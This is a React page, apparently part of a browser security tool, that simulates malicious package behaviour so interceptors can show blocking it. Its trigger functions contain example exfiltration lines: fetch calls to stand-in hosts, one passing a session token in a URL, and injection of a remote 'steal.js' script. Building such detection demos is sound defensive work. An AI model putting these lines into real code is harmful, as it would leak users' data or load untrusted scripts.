import React, { useState } from 'react';
import { 
  Terminal as TermIcon, 
  ShieldAlert, 
  Code,
  Network,
  Database,
  Flame
} from 'lucide-react';
import AttackChain from '../components/AttackChain';

export default function Sandbox() {
  const [terminalLogs, setTerminalLogs] = useState([
    '[SYSTEM] Sandbox testbed environment online. Security agent interceptors loaded.',
    '[SYSTEM] Interceptor proxies active for window.fetch, XMLHttpRequest, and localStorage.',
    '[SYSTEM] DOM Shield observer actively monitoring document elements.'
  ]);
  const [activeTrigger, setActiveTrigger] = useState(null);

  const addTerminalLog = (msg) => {
    setTerminalLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  // 1. Storage Warning (moment-timezone)
  const triggerMomentTimezone = () => {
    setActiveTrigger('storage_harvest');
    addTerminalLog('⚡ Initiating: window.localStorage.setItem("pg_cached_tz", "...") from moment-timezone...');
    
    try {
      window.localStorage.setItem('pg_cached_tz', '{"tz":"America/New_York"}');
      addTerminalLog('✓ [FLAGGED] Write allowed. Storage proxy logged telemetry event. Legacy timezone initialization detected.');
    } catch (err) {
      addTerminalLog(`✗ [ERROR] Storage writing aborted: ${err.message}`);
    }
  };

  // 2. Network Warning (lodash-legacy)
  const triggerLodashLegacy = () => {
    setActiveTrigger('network_exfil');
    addTerminalLog('⚡ Initiating: fetch("http://untrusted-analytics-tracker.cc/collect", { method: "POST" }) from lodash-legacy...');
    
    fetch('http://untrusted-analytics-tracker.cc/collect', {
      method: 'POST',
      body: JSON.stringify({ telemetry: true })
    })
      .then(() => {
        addTerminalLog('✗ [WARNING] Request succeeded - telemetry logged as warning due to untrusted domain.');
      })
      .catch(err => {
        addTerminalLog(`🛡️  [BLOCKED] Zero-Trust Shield triggered: ${err.message}`);
      });
  };

  // 3. Critical Network (crypt-miner-helper)
  const triggerCryptMiner = () => {
    setActiveTrigger('network_exfil');
    addTerminalLog('⚡ Initiating: fetch("http://eval-server.cc/exfiltrate?cookie=session_token_xyz") from crypt-miner-helper...');
    
    fetch('http://eval-server.cc/exfiltrate?cookie=session_token_xyz', {
      method: 'POST',
      body: JSON.stringify({ exfil: true })
    })
      .then(() => {
        addTerminalLog('✗ [WARNING] Request succeeded - check interceptor configurations.');
      })
      .catch(err => {
        addTerminalLog(`🛡️  [BLOCKED] Zero-Trust Shield triggered: ${err.message}`);
        addTerminalLog('🛡️  Mitigation: Exfiltration dropped. Destination reputational risk calculated above 90.');
      });
  };

  // 4. Critical DOM Injection (dom-injector-lib)
  const triggerDomInjector = () => {
    setActiveTrigger('dom_inject');
    addTerminalLog('⚡ Initiating: DOM Dynamic Script Insertion from dom-injector-lib: <script src="https://raw.githubusercontent.com/malicious-actor/exploit/main/steal.js">...');
    
    try {
      const script = document.createElement('script');
      script.src = 'https://raw.githubusercontent.com/malicious-actor/exploit/main/steal.js';
      script.type = 'text/javascript';
      
      document.body.appendChild(script);
      addTerminalLog('✗ [WARNING] Dynamic element injection completed. Scanning lifecycle state.');
    } catch (err) {
      addTerminalLog(`🛡️  [BLOCKED] DOM Shield Observer terminated insertion: ${err.message}`);
    }
  };

  return (
    <div className="flex flex-col gap-6 h-[calc(100vh-6rem)] overflow-y-auto pr-2 select-none">
      
      {/* Sandbox Control Panel */}
      <div className="glass-panel rounded-xl border border-cyber-border/40 p-5">
        <div className="flex justify-between items-start mb-6 shrink-0">
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-lg text-cyber-primary bg-cyber-primary/10">
              <ShieldAlert className="w-5 h-5" />
            </div>
            <div>
              <h2 className="font-display font-bold text-base tracking-wider uppercase text-slate-100">
                Zero-Trust Defense Simulator
              </h2>
              <p className="text-[10px] font-mono uppercase text-cyber-muted">
                Live environment hook testing
              </p>
            </div>
          </div>
          
          <div className="flex items-center gap-2">
            <span className="flex h-2 w-2 relative">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full opacity-75 bg-cyber-primary"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-cyber-primary"></span>
            </span>
            <span className="text-[10px] font-mono font-bold tracking-widest uppercase text-cyber-primary">
              Sandbox Active
            </span>
          </div>
        </div>

        <p className="text-xs leading-relaxed text-slate-300 mb-6">
          Simulate threat model execution to verify security agent responsiveness in the current browser runtime. Telemetry events instantly broadcast via WebSockets.
        </p>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
          
          {/* Warning: moment-timezone */}
          <button 
            onClick={triggerMomentTimezone}
            className="flex flex-col items-center justify-center gap-3 p-4 rounded-lg border border-cyber-warning/30 bg-cyber-warning/5 hover:bg-cyber-warning/10 transition-all group"
          >
            <div className="p-2 rounded-full bg-cyber-warning/20 text-cyber-warning group-hover:scale-110 transition-transform">
              <Database className="w-5 h-5" />
            </div>
            <div className="text-center">
              <div className="font-sans font-bold text-slate-200 text-sm mb-1">moment-timezone</div>
              <div className="text-[10px] font-mono text-cyber-warning opacity-80 uppercase">Storage Write Warning</div>
            </div>
          </button>

          {/* Warning: lodash-legacy */}
          <button 
            onClick={triggerLodashLegacy}
            className="flex flex-col items-center justify-center gap-3 p-4 rounded-lg border border-cyber-warning/30 bg-cyber-warning/5 hover:bg-cyber-warning/10 transition-all group"
          >
            <div className="p-2 rounded-full bg-cyber-warning/20 text-cyber-warning group-hover:scale-110 transition-transform">
              <Network className="w-5 h-5" />
            </div>
            <div className="text-center">
              <div className="font-sans font-bold text-slate-200 text-sm mb-1">lodash-legacy</div>
              <div className="text-[10px] font-mono text-cyber-warning opacity-80 uppercase">Network Telemetry Warning</div>
            </div>
          </button>

          {/* Critical: crypt-miner-helper */}
          <button 
            onClick={triggerCryptMiner}
            className="flex flex-col items-center justify-center gap-3 p-4 rounded-lg border border-cyber-danger/30 bg-cyber-danger/5 hover:bg-cyber-danger/10 transition-all group"
          >
            <div className="p-2 rounded-full bg-cyber-danger/20 text-cyber-danger group-hover:scale-110 transition-transform">
              <Flame className="w-5 h-5" />
            </div>
            <div className="text-center">
              <div className="font-sans font-bold text-slate-200 text-sm mb-1">crypt-miner-helper</div>
              <div className="text-[10px] font-mono text-cyber-danger opacity-80 uppercase">Critical Exfiltration</div>
            </div>
          </button>

          {/* Critical: dom-injector-lib */}
          <button 
            onClick={triggerDomInjector}
            className="flex flex-col items-center justify-center gap-3 p-4 rounded-lg border border-cyber-danger/30 bg-cyber-danger/5 hover:bg-cyber-danger/10 transition-all group"
          >
            <div className="p-2 rounded-full bg-cyber-danger/20 text-cyber-danger group-hover:scale-110 transition-transform">
              <Code className="w-5 h-5" />
            </div>
            <div className="text-center">
              <div className="font-sans font-bold text-slate-200 text-sm mb-1">dom-injector-lib</div>
              <div className="text-[10px] font-mono text-cyber-danger opacity-80 uppercase">Critical DOM Injection</div>
            </div>
          </button>

        </div>
      </div>
      
      {/* Visualizations & Real-time Console */}
      <div className="flex flex-col md:flex-row gap-6 h-full">
        
        {/* Live Attack Visualization Panel */}
        <div className="glass-panel rounded-xl border border-cyber-border/40 p-5 shrink-0 min-h-[350px] md:w-1/2">
          <AttackChain triggerType={activeTrigger} />
        </div>

        {/* Real-time Sandbox Console Output */}
        <div className="glass-panel rounded-xl border border-cyber-border/40 p-5 flex flex-col h-full min-h-[350px] md:w-1/2">
          <div className="flex items-center gap-2 mb-4 shrink-0 select-none">
            <TermIcon className="w-4 h-4 text-slate-400" />
            <div>
              <h3 className="font-sans font-bold text-sm text-slate-100">
                Sandbox Telemetry Console
              </h3>
              <span className="text-[11px] text-slate-400 block mt-0.5">
                Live debugger stream detailing proxy block event outputs
              </span>
            </div>
          </div>

          <div className="flex-1 cli-terminal p-4 rounded-lg overflow-y-auto space-y-2 text-cyan-200 font-mono text-xs leading-relaxed">
            {terminalLogs.map((log, idx) => (
              <div key={idx} className={`whitespace-pre-wrap break-all border-b border-slate-800/40 pb-1.5 last:border-0 ${log.includes('BLOCKED') ? 'text-cyber-success' : log.includes('WARNING') ? 'text-cyber-danger' : log.includes('FLAGGED') ? 'text-cyber-warning' : ''}`}>
                {log}
              </div>
            ))}
          </div>

          <div className="mt-3 text-right">
            <button
              onClick={() => setTerminalLogs([])}
              className="text-[10px] font-mono border border-slate-700 hover:border-slate-500 px-2.5 py-1 rounded text-slate-400 hover:text-slate-200 transition-all uppercase font-bold"
            >
              Clear Console
            </button>
          </div>
        </div>
      </div>

    </div>
  );
}
